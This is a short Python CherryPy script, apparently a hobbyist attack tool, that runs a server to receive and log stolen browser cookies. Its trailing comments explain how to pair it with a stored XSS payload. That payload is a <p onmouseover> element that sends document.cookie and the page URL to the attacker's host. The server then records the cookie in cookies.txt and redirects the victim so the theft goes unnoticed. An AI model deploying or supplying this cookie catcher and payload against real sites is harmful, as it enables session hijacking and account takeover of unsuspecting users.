import cherrypy
from datetime import datetime

class tool(object):
    @cherrypy.expose
    def index(self, c, u):
        f = open("cookies.txt", "a")
        f.write(c + ' ' + str(datetime.now()) + ' ' + u + '\n')
        f.close()

        raise cherrypy.HTTPRedirect(u)


if __name__ == "__main__":
    conf = {
        'global': {
            'server.socket_port': 5000,
            'server.socket_host': '0.0.0.0'
        }
    }
    cherrypy.quickstart(tool(),  '/', conf)


# --- Cookie Capture Tool for XSS ---
#
# This is a tool design to be used in conjunction with
# a Stored XSS attack,
#
# For this we can use a XSS crafted script like following example
#
# <p onmouseover="window.location='http://<your local ip>:<port>/?c='+document.cookie+'&u='+window.location.href;">Innocent comment :)<p>
#
# For this particular code the port is 5000 
#
# What this code does is, when a mouse is
# dragged over the comment with the script, it will
# trigger a GET request to this server, passing two
# arguments: the users cookie and the current url.
#
# The cookie will be saved to a text document in the
# attacker server side, and the current url is for 
# redirection to the page the user was using previous
# to the GET request, this is done soo the user doesn't
# notice that a GET request was made too a foreing URL  
#
# !! Notice !!
#
# Most browser, will NOT execute any <script> tags if they
# are added dynamically, this is not clear why it happens.
# Soo to apply this attack, one must relly on other
# element tags, like <p> used above, and the code
# inserted into event attributes

